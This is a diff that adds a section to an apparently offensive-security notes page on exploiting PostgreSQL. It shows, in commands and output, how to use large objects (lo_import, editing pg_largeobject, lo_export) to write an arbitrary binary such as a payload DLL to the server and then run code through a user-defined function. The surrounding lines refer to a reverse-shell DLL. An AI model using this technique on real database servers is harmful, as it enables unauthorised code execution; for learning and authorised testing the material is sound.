@@ -171,3 +171,90 @@ SELECT remote_test($$calc.exe$$, 3);
 ```
 
 See [PostgreSQL Extensions](/skeleton-scripts/PostgreSQL%20Extensions/) for skeleton code for a reverse shell DLL.
+
+### PostgreSQL Large Objects
+
+As it is not possible to transfer binary data using the COPY functions, another solution is needed to not have to rely on using network (SMB) to transfer data.
+
+PostgreSQL exposes a structure called _large object_, which is used for storing data that would be difficult to handle in its entirety. A typical example of data that can be stored as a large object in PostgreSQL is an image or a PDF document. As opposed to the `COPY TO` function, the advantage of large objects lies in the fact that the data they hold can be exported back to the file system as an identical copy of the original imported file.
+
+The process looks like the following:
+1. Create a large object that will hold our binary payload (e.g. a custom DLL file we created)
+2. Export that large object to the remote server file system
+3. Create a UDF that will use the exported DLL as source
+4. Trigger the UDF and execute arbitrary code
+
+A large object is created by calling the `lo_import` function and passing the path to the file we want to import:
+
+> As the return value, we are provided with the loid of the large object that was created. The loid is integral to being able to reference the large object, therefore we it is always best to pass a user-supplied loid (second parameter) so we have knowledge of the id, otherwise it would otherwise be more difficult to retrieve this id in certain exploit scenarios.
+
+```
+amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
+ lo_import
+-----------
+      1337
+(1 row)
+```
+
+To load our arbitrary binary data, we can first create a large object from an arbitrary file on the remote system and then directly update its entry in the database with the content of our choice. Large objects are stored in a table called `pg_largeobject`:
+
+> When large objects are imported into a PostgreSQL database, they are split into 2KB chunks, which are then stored individually in the pg_largeobject table.
+
+```
+amdb=# select loid, pageno from pg_largeobject;
+ loid | pageno
+------+--------
+ 1337 |      0
+(1 row)
+```
+
+The data looks like the following:
+
+```
+amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
+ loid | pageno |           encode
+------+--------+----------------------------
+ 1337 |      0 | ; for 16-bit app support\r+
+      |        | [fonts]\r                 +
+      |        | [extensions]\r            +
+      |        | [mci extensions]\r        +
+      |        | [files]\r                 +
+      |        | [Mail]\r                  +
+      |        | MAPI=1\r                  +
+      |        |
+(1 row)
+```
+
+Now we can update the content:
+
+```
+amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
+UPDATE 1
+amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
+ loid | pageno | encode
+------+--------+--------
+ 1337 |      0 | w00t
+(1 row)
+```
+
+Finally, use `lo_export` to export an arbitrary large object back to the file system:
+
+```
+amdb=# select lo_export(1337, 'C:\\new_win.ini');
+ lo_export
+-----------
+         1
+(1 row)
+```
+
+> To delete a given large object from the database, we can use the `lo_unlink` function.
+
+```
+amdb=# \lo_unlink 1337
+lo_unlink 1337
+amdb=# \lo_list
+      Large objects
+ ID | Owner | Description
+----+-------+-------------
+(0 rows)
+```
